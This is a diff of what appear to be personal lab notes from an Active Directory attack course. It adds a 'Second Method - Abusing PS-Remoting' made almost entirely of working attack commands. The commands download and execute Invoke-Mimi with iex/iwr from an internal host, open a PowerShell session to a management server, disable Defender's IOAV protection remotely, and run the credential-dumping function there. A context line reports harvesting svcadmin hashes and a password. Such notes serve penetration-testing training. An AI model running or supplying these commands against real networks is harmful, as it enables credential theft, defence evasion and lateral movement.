@@ -215,15 +215,16 @@ $null | winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:80
 we get svcadmin aes256_hmac, rc4_hmac_nt and password on DCORP-mngm
 ______
 Second Method - Abusing PS-Remoting
+Download Invoke-Mimi
 ```powershell
-echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
+iex (iwr http://172.16.100.115/Invoke-Mimi.ps1 -UseBasicParsing)
 ```
 ```powershell
-echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
+ $sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
 ```
 ```powershell
-echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
+Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
 ```
 ```powershell
-echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
+Invoke-command -ScriptBlock ${function:Invoke-Mimi} -Session $sess
 ```
